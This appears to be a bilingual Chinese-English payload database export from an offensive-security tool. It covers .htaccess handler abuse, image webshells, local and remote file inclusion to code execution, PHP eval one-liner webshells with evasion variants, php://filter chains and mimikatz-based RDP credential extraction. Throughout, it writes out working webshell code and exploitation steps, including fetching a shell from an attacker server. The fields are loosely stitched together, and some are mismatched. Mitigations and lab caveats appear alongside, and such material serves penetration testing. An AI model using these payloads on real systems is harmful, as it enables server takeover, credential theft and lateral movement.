echo serialize(new Demo()) . "\n";
unserialize('O:4:"Demo":1:{s:4:"data";N;}');
?>

?>

name.zh: .htaccess 配置利用

description.zh: 覆盖 .htaccess 目录配置执行边界：从 AddType/AddHandler 映射 PHP 处理，到 auto_prepend_file 自动包含与 ErrorDocument 指向 WebShell 等，确认配置上传后的执行影响。
description.en: Covers execution boundaries of .htaccess directory configuration: from AddType/AddHandler PHP mapping through auto_prepend_file automatic inclusion and ErrorDocument pointing to a webshell, confirming execution impact once such a config file is uploaded.

overview.zh: Web 服务器目录配置边界针对可向 Apache 上传 .htaccess 的场景：目录级配置可重写处理器映射与 PHP 运行时行为。覆盖 AddType/AddHandler、auto_prepend_file、SetHandler、ErrorDocument 与 include_path 五类配置注入。
overview.en: The web-server directory configuration boundary targets scenarios where .htaccess can be uploaded to Apache: directory-level configuration rewrites handler mappings and PHP runtime behavior. It covers five configuration injections—AddType/AddHandler, auto_prepend_file, SetHandler, ErrorDocument, and include_path.

vulnerability.zh: 根因是上传目录允许 .htaccess 覆盖且未限制可设置指令，攻击者借此把任意扩展名映射到 PHP 处理器、注入 auto_prepend 或劫持 include_path，使目录内文件按代码执行。
vulnerability.en: The root cause is upload directories permitting .htaccess overrides without restricting settable directives; attackers map arbitrary extensions to the PHP handler, inject auto_prepend, or hijack include_path, making files in the directory execute as code.

exploitation.zh: 按 Payload 列表顺序使用：先上传第 1 步含 AddType 的 .htaccess，把 PHP 内容改存 .jpg 验证映射；第 2 步 auto_prepend_file 自动包含 shell.php；扩展名被拦用第 3 步 SetHandler 强制全目录按 PHP 处理；第 4 步把 ErrorDocument 指向 shell.php 触发执行；第 5 步劫持 include_path 扩大包含。被拦截时改用最短配置变体。
exploitation.en: Use payloads in list order: upload step 1's .htaccess with AddType, store PHP content as .jpg, and verify the mapping; step 2's auto_prepend_file auto-includes shell.php; when extensions are blocked, force whole-directory PHP via step 3's SetHandler; step 4 points ErrorDocument at shell.php to trigger execution; step 5 hijacks include_path to widen inclusion. If blocked, use the minimal-config variant.

mitigation.zh:
上传目录禁用 .htaccess 覆盖并限制可设置指令；文件存储使用随机对象名并做内容级类型校验：
      <Directory "/var/www/uploads">
          AllowOverride None
          php_admin_flag engine off
          Require all denied
      </Directory>
  修复后重放第 1-5 步配置上传，全部被拒绝且目录内文件均按静态内容返回。
mitigation.en: Disable .htaccess overrides in upload directories (AllowOverride None) and restrict settable directives; store files under random object names with content-level type validation. After the fix, replay the step 1-5 config uploads and confirm all are rejected and directory files are served as static content.

title.zh: 上传映射 PHP 处理的配置

description.zh: 在 .htaccess 中用 AddType 与 AddHandler 把 .jpg、.txt 映射为 PHP 处理。命中判据：上传目录内此类文件被执行。
description.en: Use AddType/AddHandler in .htaccess to map .jpg/.txt to PHP. Success: such files execute in the upload dir.

description.zh: 用 auto_prepend_file 让目录内 PHP 执行前自动加载后门，并可用 include_path 指向上传目录。命中判据：任意 PHP 页面触发后门。
description.en: Set auto_prepend_file (and steer include_path) so every PHP page loads the backdoor. Success: any PHP page arms it.

title.en: Trigger the shell via error pages

description.en: Point ErrorDocument 404/500 at shell.php so any error arms it. Success: a 404 visit returns the shell response.

description.zh: 配置内容被检测时只保留单行 AddType 完成扩展名映射。命中判据：最短配置同样让脚本文件执行生效。
description.en: When config content is inspected, keep a single AddType line. Success: the one-liner still enables execution.

AddHandler application/x-httpd-php .pHo
php_value auto_prepend_file /proc/self/environ
<FilesMatch "\.phP$">

</FilesMatch>

description.zh: 三个新面：.pHo 大小写扩展针对大小写敏感的扩展名黑名单；auto_prepend_file 指向 /proc/self/environ 使每个 PHP 响应先携带环境流内容；FilesMatch 内 SetHandler 以正则大小写混写圈定目标。命中判据：上传目录内 jpg 改名 .pHo 后被当 PHP 执行，或响应前缀出现环境变量内容。
description.en: Three fresh faces: the .pHo mixed-case extension targets case-sensitive extension blacklists, auto_prepend_file pointed at /proc/self/environ makes every PHP response start with the environment stream, and SetHandler inside FilesMatch scopes targets with a case-mixed regex. Success: a .pHo file in the upload dir executes as PHP, or responses start with environment content.

name.zh: 图片马与伪装文件执行

description.zh: 覆盖图片马与元数据执行边界：从 Windows copy /b 与 Linux cat 拼接图片马，到 GIF89a 魔术头伪装与 EXIF Comment 注入，再到包含解析与 Apache MIME 映射让 .jpg 按 PHP 执行。
description.en: Covers image-webshell and metadata execution boundaries: from Windows copy /b and Linux cat image-webshell splicing through GIF89a magic-header disguise and EXIF Comment injection to inclusion parsing and Apache MIME mapping that makes .jpg parse as PHP.

overview.zh: 图片元数据执行边界针对图片文件携带代码绕过上传检查的场景：拼接、魔术头与 EXIF 元数据可让图片成为 PHP 载体。覆盖图片马拼接、GIF89a 与 EXIF 注入、包含解析与 Apache MIME 映射四类利用路径。
overview.en: The image-metadata execution boundary targets images carrying code past upload checks: concatenation, magic headers, and EXIF metadata can turn an image into a PHP carrier. It covers four exploitation paths: image-webshell concatenation, GIF89a and EXIF injection, inclusion/parsing, and Apache MIME mapping.

vulnerability.zh: 根因是上传校验只检查文件头或可预览性而不清洗内容，存储的图片又可被包含入口按 PHP 解释，或被 MIME 映射直接交给 PHP 处理器，图片内的代码因此获得执行机会。
vulnerability.en: The root cause is upload validation that checks only headers or previewability without sanitizing content, combined with stored images being includable as PHP or handed to the PHP handler via MIME mapping—code inside the image thus gets an execution path.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用 copy /b 或 cat 把 PHP 代码拼进图片生成 shell.jpg；只查文件头时用第 2 步 GIF89a 或 exiftool 写入 Comment；上传后按第 3 步经包含参数或 phar:// 访问并传 cmd=system('whoami');，返回用户名即执行；扩展名被拦时按第 4 步加 AddType 后直接访问 .jpg。
exploitation.en: Use payloads in list order: append PHP into an image via copy /b or cat in step 1 to produce shell.jpg; when only headers are checked, use step 2's GIF89a or exiftool Comment; after upload, access it through the inclusion parameter or phar:// per step 3 with cmd=whoami—a returned username confirms execution; when extensions are blocked, add AddType per step 4 and request the .jpg directly.

mitigation.en: Fully decode and re-encode uploaded images, strip non-standard metadata, and validate real type against an allowlist; keep upload directories non-executable, reject upload paths at inclusion endpoints, and never map image extensions to PHP. After the fix, replay steps 1-4 and confirm image webshells cannot land or execute while normal images work.

description.zh: Windows 用 copy /b、Linux 用 cat 把 PHP 代码追加到图片尾部生成 shell.jpg。命中判据：文件保留图片头且携带代码。
description.en: Append PHP code to an image via copy /b or cat to build shell.jpg. Success: the file keeps its image header and code.

attackChain.payload:
# Windows
copy test.jpg/b + shell.php/a shell.jpg
# Linux
cat test.jpg shell.php > shell.jpg
echo "<?php @eval($_POST[cmd]);?>" >> test.jpg

description.zh: 加 GIF89a 魔术头伪装，或用 exiftool 把 PHP 代码写入图片 Comment 字段。命中判据：仅查头部或可预览性的检测放行。
description.en: Prepend a GIF89a header or write code into the EXIF Comment field. Success: header-only checks let it through.

title.en: Include and execute the image shell

description.zh: 经文件包含参数与 phar:// 流访问已上传的 shell.jpg 执行内嵌代码。命中判据：传 cmd=system('whoami'); 后返回当前用户名。

name.zh: 服务端文件包含到 RCE

description.zh: 覆盖服务端文件包含的执行边界验证：从日志、会话与环境变量文件包含，到 php://input 与 data:// 包装器执行，再到远程文件包含，用于确认包含点到代码执行的可用路径。
description.en: Covers execution-boundary validation of server-side file inclusion: from log, session, and environment-variable file inclusion through php://input and data:// wrapper execution to remote file inclusion, confirming viable paths from inclusion to code execution.

overview.zh: 服务端文件包含沙箱边界针对包含参数可加载任意本地或远程资源并按 PHP 执行的场景。覆盖日志、会话、环境变量三类载体包含，php://input 与 data:// 包装器执行，以及远程文件包含五类利用路径。
overview.en: The server-side file-inclusion sandbox boundary targets inclusion parameters that can load arbitrary local or remote resources and execute them as PHP. It covers five exploitation paths: log, session, and environment-variable carriers; php://input and data:// wrapper execution; and remote file inclusion.

vulnerability.zh: 根因是用户输入直接决定 include/require 的目标且未限制 scheme 与根目录，任意可读文件、流包装器或远程 URL 的内容被当作 PHP 源码解释，注入其中的代码随包含执行。
vulnerability.en: The root cause is user input directly determining the include/require target without scheme or root restrictions; content of any readable file, stream wrapper, or remote URL is interpreted as PHP source, and code planted inside executes on inclusion.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步在 User-Agent 植入 PHP 并包含访问日志，cmd=whoami 后出现用户名即确认；日志不可用改用第 2 步会话文件或第 3 步 /proc/self/environ；流语义可用时第 4 步经 php://input 或 data:// 直接投递；allow_url_include 开启时第 5 步加载远程 shell.txt。日志路径被拦时改用 URL 编码变体。
exploitation.en: Use payloads in list order: plant PHP in the User-Agent and include the access log per step 1—a username after cmd=whoami confirms it; if logs are unavailable, switch to step 2's session file or step 3's /proc/self/environ; with stream semantics, deliver code directly via step 4's php://input or data://; with allow_url_include on, load remote shell.txt per step 5. Use URL-encoded variants when log paths are blocked.

mitigation.en: Load templates via server-side ID mapping and keep user input out of include/require; confine file roots and schemes, disable allow_url_include, and keep log and session directories off includable paths. After the fix, replay the step 1-5 carriers and confirm all are rejected while normal templates work.

description.zh: 在 User-Agent 植入 PHP 代码请求目标写入日志，再经包含参数加载日志并传 cmd。命中判据：响应输出当前用户名。
description.en: Plant PHP code in User-Agent, then include the access log with a cmd parameter. Success: the response prints the username.

description.zh: 向会话写入代码后包含 sess_[PHPSESSID] 文件，/proc/self/environ 可用同样思路投毒。命中判据：命令输出返回响应。
description.en: Write code into the session then include sess_[PHPSESSID]; /proc/self/environ works the same way. Success: command output returns.

title.zh: 输入流与内联数据执行
title.en: Execute via input and inline streams

description.zh: 用 php://input 请求体与 data:// 文本或 Base64 内联流直接承载代码执行。命中判据：输出 whoami 命令结果。
description.en: Carry code in the php://input body or data:// inline streams. Success: whoami output is returned.

description.zh: 让 file 参数加载攻击者服务器上的脚本，建立可持续的执行入口。命中判据：HTTP 日志出现脚本请求且命令执行。
description.en: Point file at a script hosted by the attacker for a lasting entry. Success: HTTP logs show the fetch and commands run.

description.zh: 日志路径被拦截时用 URL 编码与双重编码变形后提交包含请求。命中判据：编码后的路径包含成功并执行代码。
description.en: When log paths are blocked, submit URL-encoded and double-encoded variants. Success: the encoded include executes.

title.zh: URL 编码日志路径绕过
title.en: Bypass with a URL-encoded log path

description.zh: 以百分号编码形式传递日志包含路径，验证仅匹配明文 /var/log 路径的过滤规则可被编码绕过。命中判据：编码形式返回与明文路径相同的日志内容。
description.en: Pass the log-inclusion path percent-encoded, verifying filters matching only the plaintext /var/log path can be evaded. Success check: the encoded form returns the same log content as the plaintext path.

description.zh: 以单次 URL 编码、双重 URL 编码与 base64 过滤器读取三种形式呈现同一日志路径，验证仅匹配明文路径或只做一次解码的过滤可被绕过。
description.en: Present the same log path as single URL-encoded, double URL-encoded, and base64-filter forms, verifying filters that match plaintext or decode only once can be bypassed.

title.zh: 投毒 User-Agent 并经 LFI 包含访问日志
title.en: Poison the User-Agent and include the access log via LFI

description.zh: 以带 PHP eval 标记的 User-Agent 请求目标使其写入访问日志，再经文件包含参数加载该日志并传入 cmd 参数验证代码执行。命中判据：包含日志并传入 cmd=whoami 后响应输出当前用户名。
description.en: Send a PHP-tagged User-Agent that is written to the access log, then include the log through the file parameter and pass a cmd parameter to verify execution. Success check: including the log with cmd=whoami prints the current username.

title.zh: 对 Nginx 日志路径重复包含验证
title.en: Repeat inclusion against the Nginx log path

description.zh: 对 Nginx 访问日志路径重复同一包含流程，确认不同服务器日志布局下的包含可达性。命中判据：Nginx 日志包含后同样返回命令输出。
description.en: Repeat the same inclusion flow against the Nginx access log path to confirm reachability across server log layouts. Success check: including the Nginx log likewise returns command output.

title.en: Include and run via log files

description.zh: 在 User-Agent 中植入 PHP 代码后包含 Apache/Nginx 访问日志，验证被记录进日志的代码在包含时执行。命中判据：携带 cmd=whoami 包含日志后响应输出当前用户名。
description.en: Plant PHP code in the User-Agent, then include the Apache/Nginx access log, verifying logged code executes on inclusion. Success check: including the log with cmd=whoami prints the current username.

title.en: Include and run via session files

description.zh: 包含 sess_[PHPSESSID] 会话文件让其中注入的 PHP 代码执行，验证会话存储路径可控时的包含执行。命中判据：携带 cmd=whoami 包含会话文件后响应输出当前用户名。
description.en: Include the sess_[PHPSESSID] session file so injected PHP code runs, verifying inclusion-based execution via session storage. Success check: including the session file with cmd=whoami prints the current username.

title.zh: 环境变量文件包含执行

description.zh: 把 PHP 代码放入 User-Agent 后包含 /proc/self/environ，验证随请求注入的环境变量在包含时执行。命中判据：包含 /proc/self/environ 后响应输出当前用户名。
description.en: Place PHP code in the User-Agent and include /proc/self/environ, verifying request-injected environment variables execute on inclusion. Success check: including /proc/self/environ prints the current username.

description.zh: 判据: 以 php://input 原始输入流与 data:// 文本/base64 内联流作为包含目标（两者均要求 allow_url_include=On），验证请求体和内联数据可直接按 PHP 执行。命中判据：php://input 请求体或 data:// 内联流被包含执行后输出 whoami 的当前用户名。
description.en: Use the php://input raw stream and data:// text/base64 inline streams as inclusion targets, verifying request bodies and inline data run as PHP. Success check: after the php://input body or data:// inline stream is included and executed, whoami prints the current username.

description.zh: 让 file 参数加载攻击者服务器上的 shell.txt 并执行其中 PHP 代码，验证 allow_url_include 开启时的远程包含。命中判据：攻击者 HTTP 日志出现 shell.txt 请求且响应包含命令输出。
description.en: Have the file parameter load shell.txt from the attacker server and run its PHP code, verifying RFI when allow_url_include is on. Success check: the attacker HTTP log records the shell.txt request and the response contains command output.

name.zh: PHP 动态执行与一句话木马

description.zh: 覆盖 PHP 动态执行与命令执行边界验证：从 eval/assert/preg_replace 等危险函数形态，到 system 系命令执行，再到一句话木马与函数名拼接变形，用于确认 PHP 注入点的执行能力。
description.en: Covers PHP dynamic-execution and command-execution boundary validation: from dangerous-function forms such as eval/assert/preg_replace through system command execution to webshells and function-name-splicing variants, confirming the execution capability of PHP injection points.

overview.zh: PHP 动态执行边界验证针对把请求参数交给 eval/assert 等动态求值或 system 等命令函数的 PHP 注入场景。覆盖危险函数形态、命令执行、一句话木马与变形一句话四类变体，用于确认 PHP 注入点的代码与命令执行能力。
overview.en: PHP dynamic-execution boundary validation targets PHP injection scenarios where request parameters reach eval/assert dynamic evaluation or system-style command functions. It covers four variants—dangerous function forms, command execution, one-liner webshells, and obfuscated one-liners—to confirm code and command execution capability at the PHP injection point.

vulnerability.zh: 根因是应用把不可信参数传入 eval、assert、preg_replace /e、create_function 等求值结构，或拼入 system、exec、shell_exec、passthru 等命令函数；字符串因此被 PHP 解释为代码或交给系统 Shell 执行。
vulnerability.en: The root cause is untrusted parameters reaching evaluation constructs such as eval, assert, preg_replace /e, or create_function, or being concatenated into command functions like system, exec, shell_exec, and passthru; strings are thereby interpreted as PHP code or handed to the system shell.

exploitation.zh: 按 Payload 列表顺序使用：先用第 1 步 eval/assert/preg_replace 形态确认动态求值点，传入 system('id'); 出现 uid= 即命中；再用第 2 步命令函数验证执行；确认后第 3 步部署一句话木马并以 cmd=system('id'); 验证；被过滤时用第 4 步拼接与 Base64 变形；WAF 拦截改用回调与变量函数变体。
exploitation.en: Use payloads in list order: confirm dynamic-evaluation points with step 1's eval/assert/preg_replace forms—a uid= response after cmd=id is a hit; verify command execution with step 2's functions; once confirmed, deploy the step-3 one-liner webshell and verify via cmd=id; when filtered, use step 4's concatenation and Base64 variants; on WAF blocks switch to callback and variable-function variants.

mitigation.en: Remove dynamic evaluation and command concatenation in favor of fixed APIs and argument arrays; upgrade to supported PHP and retire legacy paths like assert/create_function, keeping upload directories non-executable. After the fix, replay step 1 and 2 samples and confirm evaluation and command functions reject controlled input with no anomalous child processes.

description.zh: 向可疑参数提交 eval、assert、preg_replace /e 与 create_function 等动态执行形态。命中判据：传入 system('id'); 等 PHP 代码形态后返回 uid=… 输出。
description.en: Feed eval/assert/preg_replace-e/create_function forms into suspect params. Success: cmd=id returns uid= output.

title.zh: 执行系统命令摸清权限
title.en: Run system commands to map privileges

description.zh: 用 system、exec、反引号等函数执行 whoami，确认当前进程身份与回显能力。命中判据：页面输出当前用户名。
description.en: Run whoami through system/exec/backticks to learn the process identity. Success: current username appears in the page.

description.zh: 把 @eval($_POST[cmd]) 形态的木马写入可访问的 PHP 文件，形成稳定控制点。命中判据：POST cmd=id 后返回命令输出。
description.en: Write an @eval($_POST[cmd]) style one-liner to a reachable PHP file. Success: POST cmd=id returns command output.

title.en: Mutate the webshell to evade detection

description.zh: 用动态调用、函数名拼接与 Base64 还原改造一句话，绕过静态特征检测。命中判据：变形后连接仍返回输出。
description.en: Reshape the one-liner with dynamic calls, name concat and Base64. Success: mutated shell still returns output.

description.zh: 危险函数被禁时改用变量函数 $func($cmd) 形式执行命令。命中判据：黑名单之外的形态成功执行命令。
description.en: When dangerous functions are disabled, switch to variable-function $func($cmd). Success: execution succeeds outside the blacklist.

prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

analysis.zh: PHP 动态执行边界验证只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: PHP Dynamic-Execution Boundary Validation is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: eval/system 类执行以 marker 回显验证——禁用文件写与反弹形态；注入代码不含真实凭据变量名。
opsecTips.en: Verify eval/system execution with marker echo only — no file writes or reverse shells — and keep real credential variable names out of injected code.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

description.zh: 经 array_map、call_user_func 与变量函数间接调用 assert。命中判据：cmd 参数传入后返回命令输出。失效条件：仅 PHP <8.0（严格说 <7.2 无弃用警告）且 zend.assertions=1 时成立，PHP 8.0 起 assert 不再执行字符串代码。
description.en: Invokes assert indirectly via array_map, call_user_func, and variable functions. Success check: passing cmd returns command output. Fails when: holds only on PHP below 8.0 (strictly below 7.2 to avoid deprecation warnings) with zend.assertions=1; since PHP 8.0, assert no longer evaluates string arguments.

explanation.en: Describes how the function segment "assert" participates in this validation command.

description.zh: 判据: 由 GET 参数 func 与 cmd 决定动态调用。命中判据：func=system&cmd=id 时响应包含 uid=…；如以 assert 作 func，cmd 需传 PHP 代码（如 system('id');）。
description.en: Lets GET parameters func and cmd drive the dynamic call. Success check: func=assert&cmd=id yields uid=... in the response.

explanation.zh: 变量函数调用，动态执行
explanation.en: Describes how the technique segment "$func($cmd)" participates in this validation command.

description.zh: 判据: 列举 eval、assert、preg_replace /e、create_function、array_map、call_user_func 等动态执行形态。命中判据：eval/assert/preg_replace /e 形态传入 PHP 代码（如 cmd=system('id');）后返回 uid=…；create_function 形态需调用其返回的函数；array_map/call_user_func 以回调函数名加参数组合传入后返回执行结果。
description.en: Lists dynamic-execution forms such as eval, assert, preg_replace /e, create_function, array_map, and call_user_func. Success check: passing the paired parameters returns executed output (e.g. cmd=id yields uid=...).

description.zh: 判据: 列举 system、exec、shell_exec、passthru、popen、proc_open 与反引号的命令执行形态。命中判据：system/passthru 直接输出 whoami 的当前用户名；exec/shell_exec/反引号仅返回字符串，需用 echo 包裹（如 echo `whoami`;）页面才可见用户名。
description.en: Lists command-execution forms of system, exec, shell_exec, passthru, popen, proc_open, and backticks. Success check: the page prints the current username from whoami.

explanation.zh: 执行命令返回最后一行
执行命令返回全部输出

description.zh: 判据: 部署 @eval/@assert/@system 一句话木马后按各自传参方式连接。命中判据：eval/assert 形态 POST cmd=system('id'); 后响应包含 uid=… 输出；system 形态以 GET 传 cmd=id 即返回 uid=…。
description.en: Deploys @eval/@assert/@system one-line webshells and connects through the cmd parameter. Success check: posting cmd=id returns uid=... output.

description.zh: 用动态属性调用、函数名拼接与 Base64 还原 assert 构造变形一句话。命中判据：传入 cmd 后同样返回命令输出。
description.en: Builds obfuscated one-line webshells with dynamic property calls, concatenated names, and Base64-restored assert. Success check: passing cmd likewise returns command output.

name.zh: PHP Filter Chain 代码执行

description.zh: 覆盖 php://filter 受控资源利用：从 data:// 内联流经 base64-decode 解码执行，到 filter 链生成器产出编码链，再到 iconv 与 base64 组合链投递，确认包含参数可承载任意代码流。
description.en: Covers controlled-resource exploitation via php://filter: from data:// inline streams decoded with base64-decode through chains produced by a filter-chain generator to iconv and base64 composite chain delivery, confirming include parameters can carry arbitrary code streams.

overview.zh: PHP Filter 受控资源边界针对包含参数可承载任意代码流的场景：php://filter 链可将内联数据或目标文件变换后交给 PHP 解释。覆盖 data:// 内联流、编码链生成器与 iconv+base64 组合链三类利用路径。
overview.en: The PHP filter controlled-resource boundary targets inclusion parameters that can carry arbitrary code streams: php://filter chains transform inline data or target files before PHP interprets them. It covers three exploitation paths—data:// inline streams, a filter-chain generator, and iconv+base64 combined chains.

vulnerability.zh: 根因是用户控制的包含参数进入支持 filter 的 PHP 流 API 且未限制 scheme 与转换链，过滤器链可在读取阶段把攻击者字节流还原为 PHP 代码，再由 include 语义执行。
vulnerability.en: The root cause is a user-controlled inclusion parameter reaching PHP's filter-capable stream API without scheme or chain restrictions; the filter chain can reconstruct attacker bytes into PHP code during the read phase, then executed under include semantics.

exploitation.zh: 按 Payload 列表顺序使用：先用第 1 步 data:// 加 base64-decode 验证内联流解码执行，输出 PAYLOADER_LAB 即命中；第 2 步补全媒体类型后执行 system；内容被检测拦截时用第 3 步生成器产出编码链，第 4 步以 iconv+base64 完整链投递。
exploitation.en: Use payloads in list order: first validate inline-stream decoding with step 1's data:// plus base64-decode—PAYLOADER_LAB output is a hit; run system after completing the media type in step 2; when content is blocked by detection, generate an encoded chain with step 3's generator and deliver the full iconv+base64 chain of step 4.

mitigation.en: Keep user input out of include/require, accept only server-side object IDs, and reject wrappers such as php://filter; restrict available filters and schemes. After the fix, replay the step-1 and step-4 filter chains and confirm rejection while normal template loading is unaffected.

title.en: Confirm the chain on an inline stream

description.zh: 提交 base64-decode 过滤器叠加 data:// 的包含请求，确认过滤链可作用于内联资源。命中判据：返回解码内容的执行结果。
description.en: Include a base64-decode filter over data:// to confirm the chain works on inline resources. Success: decoded content executes.

title.zh: 经 data 流执行系统命令
title.en: Execute commands via the data stream

description.zh: 把内联流换成 system($_GET[cmd]) 的 Base64 形式，经解码后执行命令。命中判据：cmd 参数返回命令输出。
description.en: Swap the stream for a Base64 of system($_GET[cmd]). Success: the cmd parameter returns command output.

title.en: Generate a filter chain for target code

description.zh: 用生成器以任意 PHP 代码为种子产出完整 php://filter 编码链。命中判据：生成结果可直接用作包含参数。
description.en: Run the chain generator seeded with target PHP code. Success: output works directly as the include parameter.

title.en: Deliver the full chain for execution

description.zh: 提交 iconv 与 base64 组合的长链载荷，不落地文件直接执行代码。命中判据：链还原的代码产生预期输出。
description.en: Submit the long iconv+base64 chain for fileless execution. Success: the seeded code produces output.

description.zh: 请求被内容检测拦截时，用编码链把 PHP 语义藏进过滤器变换层再投递。命中判据：链式载荷未被拦截且执行成功。
description.en: When content inspection blocks requests, hide PHP semantics inside filter transforms. Success: the chain passes and executes.

review.rationale: v2.0.2 数据治理：描述/opsec/前置条件差异化重写

prerequisites.zh: 确认 PHP Filter 受控资源边界 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for PHP Filter Controlled-Resource Boundary are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

analysis.zh: PHP Filter 受控资源边界只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: PHP Filter Controlled-Resource Boundary is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: filter 链会产生大量编码请求——链构造在本地完成、目标只投最终链；验证后清除生成器临时产物。
opsecTips.en: Filter chains generate heavy encoded requests — build chains locally and send only the final one, then clear generator artifacts afterwards.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

title.zh: 用 filter 链绕过内容检测
title.en: Bypass content inspection with a filter chain

description.zh: 将 iconv 与 base64 过滤器组合作用于 php://temp，验证不读取磁盘文件也能构造可控输出以绕过关键字检测。
description.en: Combine iconv and base64 filters over php://temp, verifying controllable output can be produced without touching disk files to bypass keyword inspection.

explanation.zh: iconv 字符集转换过滤器，链条中制造字节偏移
explanation.en: Charset conversion filter that shifts bytes along the chain

explanation.zh: Base64 编码过滤器，输出可控编码内容
explanation.en: Base64 encode filter producing controlled output

explanation.zh: 资源指向内存临时流，无需真实文件
explanation.en: Resource points at an in-memory temp stream, no real file needed

title.zh: 解码 data:// 内联代码流
title.en: Decode an inline data:// code stream

description.zh: 经 convert.base64-decode 过滤器解码 data://text/plain 内联流并执行其中的 PHP 代码，验证 data:// 包装器可作为受控资源载体。
description.en: Decode the inline data://text/plain stream via the convert.base64-decode filter and execute the embedded PHP code, verifying the data:// wrapper as a controlled resource.

syntaxBreakdown.part:
利用php://filter的convert.base64-decode等过滤器
通过精心构造的输入，最终生成可执行代码

title.en: Fix the data:// media type and run a system command

description.zh: 把 data:// 媒体类型补全为 text/plain 后经 base64-decode 还原 <?php system($_GET[cmd]); ?>，验证 data:// 内联代码流可执行系统命令。
description.en: With the media type completed to data://text/plain, base64-decode restores <?php system($_GET[cmd]); ?>, verifying an inline data:// code stream can run system commands.

explanation.en: Describes how the value segment "resource=" participates in this validation command.

description.zh: 调用 php_filter_chain_generator 以目标 PHP 代码为种子生成可用的 php://filter 编码链，验证生成器输出可直接用作包含参数。
description.en: Invoke php_filter_chain_generator with the target PHP code as seed to produce a working php://filter chain, verifying the output can be used directly as an inclusion parameter.

explanation.zh: 运行 filter 链生成脚本
以目标 PHP 代码作为链的生成目标
explanation.en: The target PHP code the chain must produce

description.zh: 提交 iconv 与 base64 组合的完整 php://filter 链作为包含参数。命中判据：包含执行后输出经链变换的可控内容（按链解码还原为种子 PHP 代码）。
description.en: Submits a full php://filter chain combining iconv and base64 as the inclusion parameter. Success check: inclusion emits chain-transformed controllable content that decodes back to the seed PHP code.

explanation.zh: iconv字符集转换过滤器：链式变换字节的关键环节(重复叠加)
解码过滤器在链中制造可控字节偏移
资源指向临时流，产出链条生成的代码

name.zh: RDP 配置与凭据引用审计

description.zh: 解析 .rdp 文件与凭据管理器中的 RDP 条目，验证远程桌面凭据的引用与存储方式。
description.en: Parses .rdp files and Credential Manager entries for hostnames, usernames, and password references, showing that one compromised workstation exposes a reusable set of remote-desktop credentials.

overview.zh: 该 Payload 覆盖 RDP 配置与凭据引用审计场景，检验本地保存的远程桌面连接文件与系统凭据库的泄露面。验证维度含 RDP 文件检索、cmdkey 清单与 DPAPI 凭据解密三步，对应第 1 至第 3 步。
overview.en: This payload covers RDP configuration and credential-reference auditing, testing exposure from locally saved remote-desktop files and the system credential store. Validation covers RDP file discovery, a cmdkey inventory and DPAPI credential decryption, mapped to steps 1 through 3.

vulnerability.zh: 根因在于用户目录的 RDP 文件常含主机、用户名乃至口令引用，系统凭据库又以 DPAPI 保护可被同上下文提取：一次本机沦陷即可横向批量复用远程凭据。
vulnerability.en: The root cause is RDP files in user profiles holding hosts, usernames and sometimes password references, while the credential store is DPAPI-protected but extractable in the same context: one host compromise enables broad lateral reuse of remote credentials.

exploitation.zh: 第 1 步递归检索用户文档目录的 .rdp 文件并审查其中的凭据引用；第 2 步用 cmdkey 的 list 模式列出系统保存凭据，输出目标与用户名条目即确认存储面；第 3 步用 mimikatz dpapi::cred 解密本地 Credentials 目录中 RDP 相关 blob，还原口令即确认泄露链完整。以还原出的凭据为成功判据。占位符在全局变量菜单替换。
exploitation.en: In step 1, recursively find .rdp files under user document directories and review credential references inside. In step 2, list saved system credentials with cmdkey's list mode; target and username entries confirm the stored surface. In step 3, decrypt RDP-related blobs in the local Credentials directory with mimikatz dpapi::cred; recovered passwords complete the leak chain. Judge success by recovered credentials. Replace placeholders via the global variables menu.

mitigation.zh:
禁用 RDP 客户端凭据保存策略，清理存量 .rdp 引用与凭据库条目并轮换暴露的远程口令，凭据库访问纳入监控：
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v DisablePasswordSaving /t REG_DWORD /d 1 /f
    Get-ChildItem "$env:USERPROFILE\Documents" -Filter *.rdp -Recurse | Remove-Item -Force
    cmdkey /list | Select-String "TERMSRV"        # 逐项 cmdkey /delete TERMSRV/<host> 后轮换口令
    修复后重放第 2、3 步，清单应为空且解密无产出。
mitigation.en: Disable RDP client credential-saving policy, purge legacy .rdp references, rotate exposed remote passwords, and monitor credential-store access. After the fix, replay steps 2 and 3: the inventory should be empty with no decryption output.

description.zh: 递归搜索用户文档目录中的 .rdp 连接文件；输出文件清单即掌握历史连接的目标主机地址与登录配置，圈定横向移动的目的地。
description.en: Recursively search the user profile for .rdp files; the file list reveals previously targeted hosts and their logon settings for lateral movement.

description.zh: 用 cmdkey 的 list 模式列出保存的凭据；输出 TERMSRV 开头的条目即确认存在与 RDP 目标绑定的存储凭据，可进一步解密提取。
description.en: List saved credentials with cmdkey /list; TERMSRV entries prove stored RDP credentials exist and are worth decrypting.

description.zh: 用 mimikatz 的 dpapi::cred 解密本地 Credentials 目录中的 blob；还原出明文口令后即可直接登录历史 RDP 目标，完成横向移动。
